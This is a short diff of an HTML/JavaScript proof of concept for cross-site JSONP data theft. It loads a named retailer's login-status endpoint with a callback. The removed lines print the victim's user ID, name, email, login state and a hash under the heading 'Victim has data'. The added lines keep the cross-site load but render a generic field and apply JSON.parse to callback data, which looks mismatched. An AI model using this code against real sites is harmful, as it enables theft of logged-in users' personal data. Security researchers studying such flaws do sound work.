@@ -1,19 +1,21 @@
 <script type="text/javascript">
 
 function myCallback(data) {
-    var len = data.length;
-    alert(data);
-    for (var i=0; i<len; i++) {
-        document.write('Victim has data: <br>'+
-        'Kohl User ID: '+data[i].kohlsUserId+'<br>'+
-        'User FirstName: '+ data[i].firstname+'<br>'+
-        'User LastName: '+data[i].lastname+'<br>'+
-        'User Email Address: '+data[i].emailAddress+'<br>'+
-        'User Logged In: '+data[i].userLoggedIn+'<br>'+
-        'New Hash: '+data[i].newhash+'<br><br>');
-    }
+                var mydata = JSON.parse(data);
+                alert(mydata.length);
+
+                var div = document.getElementById('data');
+
+                for(var i = 0;i < mydata.length; i++)
+                {
+                    div.innerHTML = div.innerHTML + "<p class='inner' id="+i+">"+ mydata[i].name +"</p>" + "<br>";
+                }
 }
 </script>
 <script src='https://www.kohls.com/upgrade/myaccount/login_status.jsp?callback=myCallback'></script>
 
+   <body>
+        <div id="data">
 
+        </div>
+   </body>
